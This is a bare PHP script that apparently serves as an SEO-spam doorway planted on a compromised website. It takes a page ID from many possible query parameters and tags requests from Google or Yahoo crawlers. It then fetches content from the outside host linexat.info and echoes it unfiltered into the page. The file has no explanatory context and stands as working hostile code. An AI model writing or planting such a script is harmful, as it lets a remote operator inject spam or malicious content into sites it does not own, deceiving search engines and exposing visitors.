<?php
$v_index='30409';
$v_ext=$_GET['e'];
$v_id=$_GET['p'];
if($v_id == '')
{
$v_id=$_GET['pid'];
}
if($v_id == '')
{
$v_id=$_GET['id'];
}
if($v_id == '')
{
$v_id=$_GET['blogid'];
}
if($v_id == '')
{
$v_id=$_GET['post'];
}
if($v_id == '')
{
$v_id=$_GET['page'];
}
if($v_id == '')
{
$v_id=$_GET['postid'];
}
if($v_id == '')
{
$v_id=$_GET['mid'];
}
if($v_id == '')
{
$v_id=$_GET['uid'];
}
if($v_id == '')
{
$v_id=$_GET['node'];
}
if($v_id == '')
{
$v_id=$_GET['topic'];
}
if($v_id == '')
{
$v_id=$_GET['itemid'];
}
if($v_id == '')
{
$v_id=$_GET['t'];
}
if($v_id == '')
{
$v_id=$_GET['mode'];
}


$user_agent_str=$_SERVER["HTTP_USER_AGENT"];
if (stristr($user_agent_str,'google')) {
$v_ua='1';
}
else
{

if (stristr($user_agent_str,'yahoo')) {
$v_ua='2';
}

}

$v_url = 'http://linexat.info/content/content.php?x='.$v_index.'&p='.$v_id.'&a='.$v_ua.'&e='.$v_ext;
$content_text = file_get_contents($v_url);
echo $content_text;

?>
